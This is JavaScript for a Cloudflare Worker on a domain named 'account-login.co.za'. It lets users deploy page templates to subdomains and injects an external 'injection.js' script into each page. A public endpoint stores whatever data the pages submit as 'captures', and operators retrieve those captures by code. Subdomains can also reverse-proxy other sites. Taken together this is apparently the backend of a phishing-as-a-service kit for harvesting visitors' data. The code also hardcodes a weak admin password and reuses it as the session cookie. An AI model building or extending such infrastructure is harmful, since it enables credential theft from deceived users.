/**
 * 🚀 D-TECH GLOBAL ROUTER V7.0 (API ONLY)
 * LOCATION: Cloudflare Worker
 */

const PASSWORD = "admin-secret-123";
const COOKIE_NAME = "admin_session";
const ROOT_DOMAIN = "account-login.co.za";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname; 

    // --- CORS HANDLING ---
    if (request.method === 'OPTIONS') {
      return handleOptions(request);
    }

    // Helper to wrap response with CORS headers
    const respond = (response) => {
        const corsHeaders = getCorsHeaders(request);
        const newHeaders = new Headers(response.headers);
        Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));

        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders
        });
    };

    // --- 1. ADMIN AUTHENTICATION & ROUTES ---
    // Check if the request is for an Admin page or Admin API
    const isAdminPath = url.pathname.startsWith('/admin') ||
                        url.pathname === '/api/save' ||
                        (url.pathname === '/api/captures' && request.method === 'GET') ||
                        url.pathname.startsWith('/api/admin');

    if (isAdminPath) {
        // 1.1 Handle Login POST (Publicly accessible to attempt login)
        if (url.pathname === '/admin/login' && request.method === 'POST') {
            return respond(await handleLogin(request));
        }

        const isAuth = await checkAuth(request);

        // 1.2 Block Unauthenticated
        if (!isAuth) {
            return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                status: 401,
                headers: {'Content-Type': 'application/json'}
            }));
        }

        // 1.3 Authenticated Routes
        if (url.pathname === '/api/save' && request.method === 'POST') {
            return respond(await handleSaveRequest(request, env));
        }

        if (url.pathname === '/api/captures' && request.method === 'GET') {
            return respond(await handleGetCaptures(env));
        }

        if (url.pathname === '/api/admin/templates') {
             if (request.method === 'GET') return respond(await handleGetTemplates(env));
             if (request.method === 'POST') return respond(await handleSaveTemplate(request, env));
             if (request.method === 'DELETE') return respond(await handleDeleteTemplate(request, env));
        }

        // Fallback for admin path
        return respond(new Response("Not Found", { status: 404 }));
    }

    // --- 2. PUBLIC API ENDPOINTS ---

    // Public Captures API (Protected by unique code)
    if (url.pathname === '/api/public/captures') {
        if (request.method === 'GET') return respond(await handleGetPublicCaptures(request, env));
        if (request.method === 'DELETE') return respond(await handleDeletePublicCapture(request, env));
    }

    // Handle Capture Requests (Public)
    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return respond(await handleCaptureRequest(request, env));
    }

    // Handle Public Deployment
    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
    }

    // Public Templates List
    if (url.pathname === '/api/public/templates' && request.method === 'GET') {
        return respond(await handleGetPublicTemplates(env));
    }

    // --- 3. SUBDOMAIN ROUTING (Serving Deployed Sites) ---

    let subdomain = null;
    // Parse Subdomain
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    // Only serve content if we have a valid subdomain
    if (subdomain && subdomain !== 'www') {
        // Lookup Subdomain in KV
        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

        if (!data) {
           return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
               status: 404,
               headers: { 'Content-Type': 'text/html' }
           });
        }

        if (data.type === 'HTML') {
          // Serve stored HTML directly
          return new Response(data.content, {
            headers: { 'Content-Type': 'text/html' }
          });
        }

        if (data.type === 'PROXY') {
          // Fetch content from the target URL (Reverse Proxy)
          try {
            const targetUrl = data.content;
            const forwardUrl = new URL(targetUrl);
            forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
            forwardUrl.search = url.search;

            const proxyResponse = await fetch(forwardUrl.toString(), {
              headers: {
                'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
              }
            });

            const response = new Response(proxyResponse.body, proxyResponse);
            return response;

          } catch (err) {
            return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
          }
        }
    }

    // Default Response for Root Domain (if accessed via Worker)
    return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
        headers: { 'Content-Type': 'application/json' }
    });
  }
};

// --- HELPER FUNCTIONS ---

function getCorsHeaders(request) {
    const origin = request.headers.get('Origin');
    const allowedDomain = 'https://account-login.co.za';

    // Allow Main Domain
    if (origin === allowedDomain) {
        return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'true'
        };
    }

    // Allow Subdomains (mostly for captures)
    if (origin && origin.endsWith('.account-login.co.za')) {
         return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'false'
        };
    }

    // Fallback for development/testing (optional, remove for prod if strict)
    // return {
    //     'Access-Control-Allow-Origin': '*',
    //     'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
    //     'Access-Control-Allow-Headers': 'Content-Type'
    // };

    return {};
}

function handleOptions(request) {
    const headers = getCorsHeaders(request);
    return new Response(null, {
        headers: headers
    });
}

async function checkAuth(request) {
  const cookieHeader = request.headers.get('Cookie');
  if (!cookieHeader) return false;
  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
}

async function handleLogin(request) {
    try {
        const formData = await request.formData();
        const password = formData.get('password');
        if (password === PASSWORD) {
            return new Response(JSON.stringify({ success: true }), {
                headers: {
                    'Content-Type': 'application/json',
                    // SameSite=None; Secure is required for cross-site cookies (GitHub Pages -> Worker)
                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                }
            });
        }
        return new Response(JSON.stringify({ success: false, error: "Invalid Password" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: "Error processing request" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    }
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;

    if (!subdomain || !type || !content) {
      return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
    }

    const entry = {
      type: type, // 'HTML' or 'PROXY'
      content: content,
      updated: Date.now()
    };

    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));

    return new Response(JSON.stringify({ success: true, subdomain, type }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();

    // Extract uniqueCode from body if available
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    // Store the raw captured data
    await env.SUBDOMAINS.put(key, JSON.stringify({
      timestamp: timestamp,
      data: body
    }));

    return new Response(JSON.stringify({ success: true, key: key }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetCaptures(env) {
  try {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys;
    const latestKeys = keys.slice(-20).reverse();

    const promises = latestKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);

    return new Response(JSON.stringify({ success: true, data: results }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
     return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const keys = list.keys;
    const templates = await Promise.all(keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetPublicTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = list.keys.map(k => k.name.replace("template::", ""));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveTemplate(request, env) {
    const body = await request.json();
    const { name, content } = body;
    if (!name || !content) return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });

    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, updated: Date.now() }));
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteTemplate(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return new Response(JSON.stringify({ success: false, error: "Missing name" }), { status: 400 });

    await env.SUBDOMAINS.delete(`template::${name}`);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const body = await request.json();
        const { subdomain, uniqueCode, templateName } = body;

        // Validation
        if (!subdomain || !uniqueCode || !templateName) return jsonError("Missing fields");
        if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");

        // Check availability
        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) return jsonError("Subdomain already taken");

        // Check unique code usage
        const existingCode = await env.SUBDOMAINS.get(`code_map::${uniqueCode}`);
        if (existingCode) return jsonError("Unique code already used");

        // Get Template
        const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
        if (!templateData) return jsonError("Template not found");

        // --- SCRIPT INJECTION ---
        // Instead of inlining the code, we link to the external script on GitHub.
        const scriptUrl = 'https://account-login.co.za/injection.js';

        // We inject the unique code as a global variable, securely serialized.
        const injectionBlock = `
        <script>
        window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};
        </script>
        <script src="${scriptUrl}"></script>
        `;

        let html = templateData.content;
        // Inject before </body> if exists, else append
        if (html.includes('</body>')) {
            html = html.replace('</body>', `${injectionBlock}</body>`);
        } else {
            html += injectionBlock;
        }

        // Save Subdomain
        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: html,
            updated: Date.now(),
            ownerCode: uniqueCode
        }));

        // Save Code Map
        await env.SUBDOMAINS.put(`code_map::${uniqueCode}`, JSON.stringify({
            subdomain: subdomain,
            created: Date.now()
        }));

        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicCaptures(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    // List keys with prefix 'capture::{code}::'
    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
    const keys = list.keys.slice(-50).reverse(); // Last 50

    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicCapture(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const key = url.searchParams.get('key');
    if (!code || !key) return jsonError("Missing fields");

    // Security check: Ensure key belongs to code
    if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);

    await env.SUBDOMAINS.delete(key);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

function jsonError(msg, status = 400) {
    return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
}
